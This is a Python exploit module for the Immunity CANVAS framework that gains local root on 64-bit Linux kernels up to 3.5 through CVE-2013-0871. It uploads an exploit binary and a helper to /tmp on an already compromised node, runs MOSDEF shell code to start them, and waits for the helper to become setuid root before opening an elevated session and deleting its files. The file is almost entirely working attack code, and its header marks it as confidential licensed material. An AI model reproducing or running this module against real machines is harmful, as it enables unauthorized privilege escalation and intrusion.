#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import time
import os
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode

NAME                           = 'linux_ptrace_setregs local root'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges through CVE-2013-0871'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Linux'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2013-0871'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0871'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Linux', 'x64']]

DOCUMENTATION['Notes'] = """

Vulnerable kernels <= 3.5 64-bit only.

Tested on:
- Ubuntu 12.10 64bit
- Ubuntu 12.04 64bit
- Debian 6 64bit

Besides running the module inside CANVAS (which requires an existing MOSDEF connection)
one can simply upload the exploit executable (CANVAS_ROOT/exploits/linux_ptrace_setregs/Resources/x)
to the target machine and execute it.

./x -h

Usage: ./x <options...>

Options:    -h this help message
            -x <npages to use> (default: 64)
            -n <victim nice value> (default: 19)
            -i <iterations before sig> (default: 5)
            -s <signals to send> (default: 10)
            -u <force # cpus> (default: autodetect)
            -z <base cpu id> (default: 0)
            -f <uncached file name> (default: random)
            -t <tmp dir> (default: /tmp)

"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name       = NAME
        self.node       = None
        self.local_path = os.path.join(os.path.dirname(__file__), 'Resources')
        self.lx         = os.path.join(self.local_path, 'x')
        self.lh         = os.path.join(self.local_path, 'h')
        self.dx         = '/tmp/x'
        self.dh         = '/tmp/h'

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def nodeUpload(self, src, dst):
        try:
            self.node.upload(src, destfilename=dst)
        except NodeCommandError, ex:
            self.log('[!] Failed to upload %s to %s: %s' % (src, dst, ex))
            return False

        self.log('[+] Upload succeeded ...')
        return True

    def statFile(self, path):
        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
        fd = self.node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            self.log('[x] Could not open %s ...' % path)
            return {}
        ret,stat = self.node.shell.fstat(fd)
        self.node.shell.close(fd)
        if ret == 0:
            #self.log('[+] st_mode: %x' % stat['st_mode'])
            #self.log('[+] st_uid: %x' % stat['st_uid'])
            return stat
        else:
            self.log('[x] fstat failed ...')
            return {}

    def cleanup(self):
        self.log('[+] Cleaning up...')
        self.node.runcommand('rm -f %s %s' % (self.dx, self.dh))

    def execveHelper(self, wait = 0):
        lvars = {}
        lvars['ENV_XP'] = 'ENV_XP=%s' % self.dx
        lvars['HELPER'] = self.dh
        lvars['MOSDEF'] = '%d' % self.node.shell.fd
        lvars['WAIT']   = wait

        code = """
        #import "string", "ENV_XP" as "ENV_XP"
        #import "string", "HELPER" as "HELPER"
        #import "string", "MOSDEF" as "MOSDEF"

        #import "int", "WAIT" as "WAIT"

        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            char *argv[3];
            char *env[2];
            int pid;

            argv[0] = HELPER;
            argv[1] = MOSDEF;
            argv[2] = NULL;

            env[0] = ENV_XP;
            env[1] = NULL;

            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, env);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """
        ret = self.node.shell.runCode(code, lvars)
        #self.log('[+] execve helper ret: %d ...' % ret)
        return ret

    def run(self):
        self.node = self.argsDict['passednodes'][0]

        if isinstance(self.node, linuxNode):
            if self.node.proctype != 'x64':
                self.log('Node of type %s proctype %s is not supported.' % (self.node.nodetype, self.node.proctype))
                return 0

        smep = self.check_smep()
        if (smep):
            self.log('[+] Found SMEP on target host')
            self.log('[x] Aborting')
            return False

        stat = self.statFile(self.dh)
        if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
            self.log('[+] Already compromised')
            self.log('[+] Initing elevated MOSDEF loop...')
            self.execveHelper(wait = 1)
            return True

        self.log('[+] Uploading helper and exploit ...')
        if self.nodeUpload(self.lx, self.dx) == False:
            return False
        if self.nodeUpload(self.lh, self.dh) == False:
            return False

        self.log('[+] Executing helper...')
        self.execveHelper()

        self.log('[+] Waiting...')

        # snooze is set to 60 in helper
        i = 60
        while i:
            stat = self.statFile(self.dh)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                self.log('[+] Compromised!')
                self.execveHelper(wait = 1)
                self.cleanup()
                self.log('[+] Done')
                break
            i -= 1
            time.sleep(1)
        if not i:
            self.log('[x] Looks like we failed, try again!')
            self.cleanup()
            return False

        return True
